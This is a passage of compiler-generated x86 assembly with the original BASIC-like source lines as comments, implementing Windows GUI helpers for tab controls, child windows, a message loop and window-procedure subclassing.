; [1946] tci.mask 		= $$TCIF_TEXT
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,1			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1947] tci.pszText 	= &title
	mov	eax,d[ebp+12]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+12],eax			;;; i13b
;
; [1948] tci.cchTextMax 	= LEN(title)
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.352			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.352:
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+16],eax			;;; i13b
;
; [1949] SendMessageA (hparent, $$TCM_INSERTITEM, upper, &tci)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	push	4871			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1951] exstyle = $$WS_EX_TRANSPARENT | $$WS_EX_ACCEPTFILES | $$WS_EX_STATICEDGE | $$WS_EX_CONTROLPARENT
#ifdef AddEditTabChild.exstyle
#undef AddEditTabChild.exstyle
#endif
#define AddEditTabChild.exstyle ebp-64	; exposes local variable 'exstyle'
;
	mov	eax,32			;;; i659
	or	eax,16			;;; i763
	or	eax,131072			;;; i763
	or	eax,65536			;;; i763
	mov	d[ebp-64],eax			;;; i670
;
; [1952] style = style | $$ES_MULTILINE | $$ES_READONLY | $$ES_LEFT
	mov	eax,d[ebp+20]			;;; i665
	or	eax,4			;;; i763
	or	eax,2048			;;; i763
	or	eax,0			;;; i763
	mov	d[ebp+20],eax			;;; i670
;
; [1953] TabChildCon[upper] = NewChild ("edit", "", style, 1, 20, 300, 300, hparent, IDC, exstyle)
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
; .xstk2A.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	push	[ebp-64]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	300			;;; i656a
	push	300			;;; i656a
	push	20			;;; i656a
	push	1			;;; i656a
	push	[ebp+20]			;;; i674a
	push	0			;;; i665a
	push	[ebp-72]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	ebx,d[ebp-60]			;;; i665
	mov	ecx,d[%%%TabChildCon.client]			;;; i663a
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	d[ebx],eax			;;; i30
;
; [1955] RETURN TabChildCon[upper]
	mov	eax,d[ebp-60]			;;; i665
	mov	edx,d[%%%TabChildCon.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	jmp	end.func2A.client			;;; i258
;
; [1956] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.AddEditTabChild.client:  ;;; Function end label for Assembly Programmers.
end.func2A.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  AddEditTabChild ()  *****
;  *****
;
; [1958] FUNCTION AddTreeTabChild (hparent,STRING title,IDC,style)
.code
;
#ifdef AddTreeTabChild.hparent
#undef AddTreeTabChild.hparent
#endif
#define AddTreeTabChild.hparent ebp+8	; exposes function argument 'hparent'
;
;
#ifdef AddTreeTabChild.title
#undef AddTreeTabChild.title
#endif
#define AddTreeTabChild.title ebp+12	; exposes function argument 'title'
;
;
#ifdef AddTreeTabChild.IDC
#undef AddTreeTabChild.IDC
#endif
#define AddTreeTabChild.IDC ebp+16	; exposes function argument 'IDC'
;
;
#ifdef AddTreeTabChild.style
#undef AddTreeTabChild.style
#endif
#define AddTreeTabChild.style ebp+20	; exposes function argument 'style'
;
align 16
_AddTreeTabChild.client@16:
;  *****
;  *****  FUNCTION  AddTreeTabChild ()  *****
;  *****
func2B.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.363:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.363			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody2B.client:
;
; [1959] SHARED TabChildCon[]
;
; [1960] TC_ITEM tci
; .composites = ebp-40	; internal variable
#ifdef AddTreeTabChild.tci
#undef AddTreeTabChild.tci
#endif
#define AddTreeTabChild.tci ebp-44	; exposes local variable 'tci'
;
;
; [1963] found = $$FALSE
#ifdef AddTreeTabChild.found
#undef AddTreeTabChild.found
#endif
#define AddTreeTabChild.found ebp-48	; exposes local variable 'found'
;
	mov	eax,0			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1964] FOR h = 0 TO UBOUND(TabChildCon[])
#ifdef AddTreeTabChild.h
#undef AddTreeTabChild.h
#endif
#define AddTreeTabChild.h ebp-52	; exposes local variable 'h'
;
	mov	eax,0			;;; i659
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.357			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.357:
	dec	eax			;;; i596
; .forlimit2B.00C8 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
align 8
for.00C8.client:
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-56]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00C8.client			;;; i154
;
; [1965] IFZ TabChildCon[h] THEN
	mov	eax,d[ebp-52]			;;; i665
	mov	edx,d[%%%TabChildCon.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	test	eax,eax			;;; i194
	jnz	>> else.00C9.client			;;; i195
;
; [1966] upper = h
#ifdef AddTreeTabChild.upper
#undef AddTreeTabChild.upper
#endif
#define AddTreeTabChild.upper ebp-60	; exposes local variable 'upper'
;
	mov	eax,d[ebp-52]			;;; i665
	mov	d[ebp-60],eax			;;; i670
;
; [1967] found = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[ebp-48],eax			;;; i670
;
; [1968] EXIT FOR
	jmp	end.for.00C8.client			;;; i145
;
; [1969] END IF
else.00C9.client:
end.if.00C9.client:
;
; [1970] NEXT h
do.next.00C8.client:
	inc	d[ebp-52]			;;; i229
	jmp	for.00C8.client			;;; i231
end.for.00C8.client:
;
; [1972] IFF found THEN
	mov	eax,d[ebp-48]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.00CA.client			;;; i195
;
; [1973] upper = UBOUND(TabChildCon[])
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.359			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.359:
	dec	eax			;;; i596
	mov	d[ebp-60],eax			;;; i670
;
; [1974] INC upper
	inc	d[ebp-60]			;;; i84
;
; [1975] REDIM TabChildCon[upper]
	sub	esp,64			;;; i430
	mov	eax,d[ebp-60]			;;; i665
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%%TabChildCon.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073217532			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_RedimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%%TabChildCon.client],eax			;;; i668
;
; [1976] END IF
else.00CA.client:
end.if.00CA.client:
;
; [1978] tci.mask 		= $$TCIF_TEXT
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,1			;;; i659
	mov	d[eax],ebx			;;; i13b
;
; [1979] tci.pszText 	= &title
	mov	eax,d[ebp+12]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+12],eax			;;; i13b
;
; [1980] tci.cchTextMax 	= LEN(title)
	mov	eax,d[ebp+12]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.360			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.360:
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+16],eax			;;; i13b
;
; [1981] SendMessageA (hparent, $$TCM_INSERTITEM, upper, &tci)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-60]			;;; i674a
	push	4871			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1983] exstyle = $$WS_EX_STATICEDGE' | $$WS_EX_CONTROLPARENT ' | $$WS_EX_TRANSPARENT | $$WS_EX_ACCEPTFILES |
#ifdef AddTreeTabChild.exstyle
#undef AddTreeTabChild.exstyle
#endif
#define AddTreeTabChild.exstyle ebp-64	; exposes local variable 'exstyle'
;
	mov	eax,131072			;;; i657
	mov	d[ebp-64],eax			;;; i670
;
; [1984] style = style | $$TVS_FULLROWSELECT | $$WS_TABSTOP
	mov	eax,d[ebp+20]			;;; i665
	or	eax,4096			;;; i763
	or	eax,65536			;;; i763
	mov	d[ebp+20],eax			;;; i670
;
; [1985] TabChildCon[upper] = NewChild ($$WC_TREEVIEW, "", style, 1, 20, 300, 300, hparent, IDC, exstyle )' $$WS_EX_CLIENTEDGE)
	mov	eax,addr @_string.24AB.client			;;; i663
	call	%_clone.a0			;;; i634
; .xstk2B.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	push	[ebp-64]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+8]			;;; i674a
	push	300			;;; i656a
	push	300			;;; i656a
	push	20			;;; i656a
	push	1			;;; i656a
	push	[ebp+20]			;;; i674a
	push	0			;;; i665a
	push	[ebp-72]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	ebx,d[ebp-60]			;;; i665
	mov	ecx,d[%%%TabChildCon.client]			;;; i663a
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	d[ebx],eax			;;; i30
;
; [1987] RETURN TabChildCon[upper]
	mov	eax,d[ebp-60]			;;; i665
	mov	edx,d[%%%TabChildCon.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	jmp	end.func2B.client			;;; i258
;
; [1988] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.AddTreeTabChild.client:  ;;; Function end label for Assembly Programmers.
end.func2B.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  AddTreeTabChild ()  *****
;  *****
;
; [1990] FUNCTION GetTabChild (htabc)
.code
;
#ifdef GetTabChild.htabc
#undef GetTabChild.htabc
#endif
#define GetTabChild.htabc ebp+8	; exposes function argument 'htabc'
;
align 16
_GetTabChild.client@4:
;  *****
;  *****  FUNCTION  GetTabChild ()  *****
;  *****
func29.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody29.client:
;
; [1991] SHARED TabChildCon[]
;
; [1994] RETURN TabChildCon[htabc]
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%TabChildCon.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	jmp	end.func29.client			;;; i258
;
; [1995] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetTabChild.client:  ;;; Function end label for Assembly Programmers.
end.func29.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetTabChild ()  *****
;  *****
;
; [1997] FUNCTION GetNotifyMsg (lParam, hwndFrom, idFrom, code)
.code
;
#ifdef GetNotifyMsg.lParam
#undef GetNotifyMsg.lParam
#endif
#define GetNotifyMsg.lParam ebp+8	; exposes function argument 'lParam'
;
;
#ifdef GetNotifyMsg.hwndFrom
#undef GetNotifyMsg.hwndFrom
#endif
#define GetNotifyMsg.hwndFrom ebp+12	; exposes function argument 'hwndFrom'
;
;
#ifdef GetNotifyMsg.idFrom
#undef GetNotifyMsg.idFrom
#endif
#define GetNotifyMsg.idFrom ebp+16	; exposes function argument 'idFrom'
;
;
#ifdef GetNotifyMsg.code
#undef GetNotifyMsg.code
#endif
#define GetNotifyMsg.code ebp+20	; exposes function argument 'code'
;
align 16
_GetNotifyMsg.client@16:
;  *****
;  *****  FUNCTION  GetNotifyMsg ()  *****
;  *****
func28.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody28.client:
;
; [1998] NMHDR nmhdr
; .composites = ebp-40	; internal variable
#ifdef GetNotifyMsg.nmhdr
#undef GetNotifyMsg.nmhdr
#endif
#define GetNotifyMsg.nmhdr ebp-44	; exposes local variable 'nmhdr'
;
;
; [2000] RtlMoveMemory (&nmhdr, lParam, SIZE(nmhdr))
	mov	eax,d[ebp-44]			;;; i642
; .xstk28.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	mov	eax,12			;;; i584
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	_RtlMoveMemory@12			;;; i619
;
; [2001] hwndFrom = nmhdr.hwndFrom
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	mov	d[ebp+12],eax			;;; i670
;
; [2002] idFrom   = nmhdr.idFrom
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	mov	d[ebp+16],eax			;;; i670
;
; [2003] code     = nmhdr.code
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	mov	d[ebp+20],eax			;;; i670
;
; [2004] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetNotifyMsg.client:  ;;; Function end label for Assembly Programmers.
end.func28.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  GetNotifyMsg ()  *****
;  *****
;
; [2006] FUNCTION  NewWindow (className$, titleBar$, style, x, y, w, h, exStyle)
.code
;
#ifdef NewWindow.className$
#undef NewWindow.className$
#endif
#define NewWindow.className$ ebp+8	; exposes function argument 'className$'
;
;
#ifdef NewWindow.titleBar$
#undef NewWindow.titleBar$
#endif
#define NewWindow.titleBar$ ebp+12	; exposes function argument 'titleBar$'
;
;
#ifdef NewWindow.style
#undef NewWindow.style
#endif
#define NewWindow.style ebp+16	; exposes function argument 'style'
;
;
#ifdef NewWindow.x
#undef NewWindow.x
#endif
#define NewWindow.x ebp+20	; exposes function argument 'x'
;
;
#ifdef NewWindow.y
#undef NewWindow.y
#endif
#define NewWindow.y ebp+24	; exposes function argument 'y'
;
;
#ifdef NewWindow.w
#undef NewWindow.w
#endif
#define NewWindow.w ebp+28	; exposes function argument 'w'
;
;
#ifdef NewWindow.h
#undef NewWindow.h
#endif
#define NewWindow.h ebp+32	; exposes function argument 'h'
;
;
#ifdef NewWindow.exStyle
#undef NewWindow.exStyle
#endif
#define NewWindow.exStyle ebp+36	; exposes function argument 'exStyle'
;
align 16
_NewWindow.client@32:
;  *****
;  *****  FUNCTION  NewWindow ()  *****
;  *****
funcA.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBodyA.client:
;
; [2007] SHARED hInst
;
; [2010] RegisterWinClass (className$, titleBar$)
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
; .xstkA.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	call	func8.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2011] 'IFZ	RegisterWinClass (className$, titleBar$) THEN QUIT(0)
;
; [2012] RETURN CreateWindowExA (exStyle, &className$, &titleBar$, style, x, y, w, h, 0, 0, hInst, 0)
;
; [0] EXTERNAL FUNCTION CreateWindowExA (dwExStyle, lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam)
	mov	eax,d[ebp+8]			;;; i642
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i642
; .xstkA.0001 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	[%hInst.client]			;;; i672a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp+32]			;;; i674a
	push	[ebp+28]			;;; i674a
	push	[ebp+24]			;;; i674a
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp+36]			;;; i674a
	call	_CreateWindowExA@48			;;; i619
	jmp	end.funcA.client			;;; i258
;
; [2013] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.NewWindow.client:  ;;; Function end label for Assembly Programmers.
end.funcA.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	32			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  NewWindow ()  *****
;  *****
;
; [2015] FUNCTION  NewChild (className$, text$, style, x, y, w, h, parent, id, exStyle)
.code
;
#ifdef NewChild.className$
#undef NewChild.className$
#endif
#define NewChild.className$ ebp+8	; exposes function argument 'className$'
;
;
#ifdef NewChild.text$
#undef NewChild.text$
#endif
#define NewChild.text$ ebp+12	; exposes function argument 'text$'
;
;
#ifdef NewChild.style
#undef NewChild.style
#endif
#define NewChild.style ebp+16	; exposes function argument 'style'
;
;
#ifdef NewChild.x
#undef NewChild.x
#endif
#define NewChild.x ebp+20	; exposes function argument 'x'
;
;
#ifdef NewChild.y
#undef NewChild.y
#endif
#define NewChild.y ebp+24	; exposes function argument 'y'
;
;
#ifdef NewChild.w
#undef NewChild.w
#endif
#define NewChild.w ebp+28	; exposes function argument 'w'
;
;
#ifdef NewChild.h
#undef NewChild.h
#endif
#define NewChild.h ebp+32	; exposes function argument 'h'
;
;
#ifdef NewChild.parent
#undef NewChild.parent
#endif
#define NewChild.parent ebp+36	; exposes function argument 'parent'
;
;
#ifdef NewChild.id
#undef NewChild.id
#endif
#define NewChild.id ebp+40	; exposes function argument 'id'
;
;
#ifdef NewChild.exStyle
#undef NewChild.exStyle
#endif
#define NewChild.exStyle ebp+44	; exposes function argument 'exStyle'
;
align 16
_NewChild.client@40:
;  *****
;  *****  FUNCTION  NewChild ()  *****
;  *****
funcB.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBodyB.client:
;
; [2016] SHARED hInst
;
; [2018] ' create child control
;
; [2019] style = style | $$WS_CHILD | $$WS_VISIBLE
	mov	eax,d[ebp+16]			;;; i665
	or	eax,1073741824			;;; i763
	or	eax,268435456			;;; i763
	mov	d[ebp+16],eax			;;; i670
;
; [2020] RETURN CreateWindowExA (exStyle, &className$, &text$, style, x, y, w, h, parent, id, hInst, 0)
	mov	eax,d[ebp+8]			;;; i642
; .xstkB.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i642
; .xstkB.0001 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	[%hInst.client]			;;; i672a
	push	[ebp+40]			;;; i674a
	push	[ebp+36]			;;; i674a
	push	[ebp+32]			;;; i674a
	push	[ebp+28]			;;; i674a
	push	[ebp+24]			;;; i674a
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp+44]			;;; i674a
	call	_CreateWindowExA@48			;;; i619
	jmp	end.funcB.client			;;; i258
;
; [2021] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.NewChild.client:  ;;; Function end label for Assembly Programmers.
end.funcB.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	40			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  NewChild ()  *****
;  *****
;
; [2023] FUNCTION  MessageLoop ()
.code
align 16
_MessageLoop.client@0:
;  *****
;  *****  FUNCTION  MessageLoop ()  *****
;  *****
funcC.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBodyC.client:
;
; [2024] STATIC USER32_MSG msg
data section 'globals$statics'
align	4
%C%msg.client:	db 4 dup ?
.code
;
; [2027] DO
align 8
do.00CB.client:
;
; [2028] SELECT CASE GetMessageA (&msg, hwnd, 0, 0)
;
; [0] EXTERNAL FUNCTION GetMessageA (lpMsg, hwnd, wMsgFilterMin, wMsgFilterMax)
	mov	eax,d[%C%msg.client]			;;; i642
; .xstkC.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
#ifdef MessageLoop.hwnd
#undef MessageLoop.hwnd
#endif
#define MessageLoop.hwnd ebp-48	; exposes local variable 'hwnd'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	push	[ebp-44]			;;; i674a
	call	_GetMessageA@16			;;; i619
; .selectC.00CC = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
;
; [2029] CASE  0 	:RETURN msg.wParam
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-52]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00CC.0001.client			;;; i71
	mov	eax,d[%C%msg.client]			;;; i663a
	mov	eax,d[eax+8]			;;; i313b
	jmp	end.funcC.client			;;; i258
;
; [2030] CASE -1 	:RETURN $$TRUE
	jmp	end.select.00CC.client			;;; i69
case.00CC.0001.client:
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	ebx,d[ebp-52]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00CC.0002.client			;;; i71
	mov	eax,-1			;;; i659
	jmp	end.funcC.client			;;; i258
;
; [2031] CASE ELSE	:TranslateMessage (&msg)
	jmp	end.select.00CC.client			;;; i69
case.00CC.0002.client:
;
; [0] EXTERNAL FUNCTION TranslateMessage (lpMsg)
	mov	eax,d[%C%msg.client]			;;; i642
	push	eax			;;; i667a
	call	_TranslateMessage@4			;;; i619
;
; [2032] DispatchMessageA (&msg)
;
; [0] EXTERNAL FUNCTION DispatchMessageA (lpMsg)
	mov	eax,d[%C%msg.client]			;;; i642
	push	eax			;;; i667a
	call	_DispatchMessageA@4			;;; i619
;
; [2033] END SELECT
end.select.00CC.client:
;
; [2034] LOOP
do.loop.00CB.client:
	jmp	do.00CB.client			;;; i222
end.do.00CB.client:
;
; [2036] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.MessageLoop.client:  ;;; Function end label for Assembly Programmers.
end.funcC.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  MessageLoop ()  *****
;  *****
;
; [2038] FUNCTION  CreateCallbacks ()
.code
align 16
_CreateCallbacks.client@0:
;  *****
;  *****  FUNCTION  CreateCallbacks ()  *****
;  *****
funcD.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBodyD.client:
;
; [2040] '	assign a new callback function to be used by child edit controls
;
; [2041] #old_proc = SetWindowLongA(#CmdLine, $$GWL_WNDPROC, &EditProc())
data section 'globals$shared'
align	4
%#old_proc.client:	db 4 dup ?
.code
;
; [0] EXTERNAL FUNCTION SetWindowLongA (hwnd, nIndex, dwNewLong)
	mov	eax,addr _EditProc.client@16			;;; i599
	push	eax			;;; i667a
	push	-4			;;; i656a
	push	[%#CmdLine.client]			;;; i672a
	call	_SetWindowLongA@12			;;; i619
	mov	d[%#old_proc.client],eax			;;; i668
;
; [2043] #down_proc = SetWindowLongA(#download_tab, $$GWL_WNDPROC, &downProc())
data section 'globals$shared'
align	4
%#down_proc.client:	db 4 dup ?
.code
	mov	eax,addr _downProc.client@16			;;; i599
	push	eax			;;; i667a
	push	-4			;;; i656a
	push	[%#download_tab.client]			;;; i672a
	call	_SetWindowLongA@12			;;; i619
	mov	d[%#down_proc.client],eax			;;; i668
;
; [2044] #edit3_proc = SetWindowLongA(#edit3, $$GWL_WNDPROC, &edit3Proc())
